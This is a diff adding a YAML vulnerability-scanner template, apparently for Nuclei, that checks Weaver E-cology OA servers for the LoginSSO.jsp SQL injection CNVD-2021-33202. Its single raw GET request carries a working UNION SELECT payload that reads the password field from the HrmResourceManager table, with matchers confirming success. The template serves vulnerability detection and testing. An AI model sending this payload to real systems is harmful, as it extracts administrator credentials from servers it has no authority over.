@@ -1,0 +1,32 @@
+id: fanweiOA-E-cology-LoginSSO-jsp-sql
+
+info:
+  name: 泛微E-cology-LoginSSO.jsp存在QL注入漏洞(CNVD-2021-33202)
+  author: cnaq
+  severity: high 
+  description: 泛微E-cology-LoginSSO.jsp存在QL注入漏洞(CNVD-2021-33202)
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-cology-LoginSSO.jsp%E5%AD%98%E5%9C%A8QL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CNVD-2021-33202).md#%E6%B3%9B%E5%BE%AEe-cology-loginssojsp%E5%AD%98%E5%9C%A8ql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecnvd-2021-33202
+  tags: fanwei,oa,ecology,sql
+
+requests:
+  - raw:
+      - |
+        GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - '<code' 
+
+
+    
+
